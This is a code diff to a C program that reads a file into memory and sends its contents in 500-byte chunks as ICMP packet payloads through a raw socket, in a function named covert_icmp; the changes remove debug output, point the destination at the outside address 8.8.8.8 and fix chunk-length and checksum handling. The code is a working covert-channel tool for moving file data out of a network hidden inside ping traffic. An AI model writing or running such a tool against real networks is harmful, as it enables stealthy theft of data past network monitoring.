@@ -23,10 +23,8 @@ int main(int argc, char *argv[]) {
     fclose(fp);
 
     data[fsize] = 0;
-
-    printf("data is: %d\n", strlen(data));
     
-    struct hostent *host = gethostbyname("192.168.106.1");
+    struct hostent *host = gethostbyname("8.8.8.8");
     struct in_addr *dst;
 
     dst = (struct in_addr *)host->h_addr_list[0];
@@ -45,7 +43,7 @@ int covert_icmp(struct in_addr *dst, char *data) {
     int on = 1;
     int chunk_size = 500;
     int chunk = 1;
-    int ch;
+    int ch, data_length=0;
 
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if(sock < 0) {
@@ -53,7 +51,6 @@ int covert_icmp(struct in_addr *dst, char *data) {
         return -1;
     }
 
-    printf("chunk: %d\n", ((strlen(data)+(chunk_size-1))/chunk_size));
     chunk = ((strlen(data)+(chunk_size-1))/chunk_size);
 
     setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
@@ -75,18 +72,31 @@ int covert_icmp(struct in_addr *dst, char *data) {
 
     for(int i=0;i<chunk;i++) {
 
-        memcpy(packet, &icmp_hdr, sizeof(icmp_hdr));
-        memcpy(packet + sizeof(icmp_hdr), data+(i*chunk_size), chunk_size);
+        if(i == (chunk-1)) {
+            if(((chunk*chunk_size) - strlen(data)) > 0) {
+                data_length = strlen(data) - ((chunk-1) * chunk_size);
+                //data_length = (chunk * chunk_size) - data_length;
+            } else {
+                data_length = chunk_size;
+            }
+        } else {
+            data_length = chunk_size;
+        }
 
-        icmp_hdr.checksum = icmp_chk(packet, sizeof(icmp_hdr)+chunk_size);
+        memcpy(packet, &icmp_hdr, sizeof(icmp_hdr));
+        memcpy(packet + sizeof(icmp_hdr), data+(i*chunk_size), data_length);
+
+        icmp_hdr.checksum = icmp_chk(packet, sizeof(icmp_hdr)+data_length);
         memcpy(packet, &icmp_hdr, sizeof(icmp_hdr));
 
-        if((ch = sendto(sock, packet, sizeof(icmp_hdr) + chunk_size, 0, 
+        if((ch = sendto(sock, packet, sizeof(icmp_hdr) + data_length, 0, 
                     (struct sockaddr*)&addr, sizeof(addr))) <= 0) {
 
             perror("sendto");
             return -1;
         }
+
+        icmp_hdr.checksum = 0;
 
     }
     close(sock);
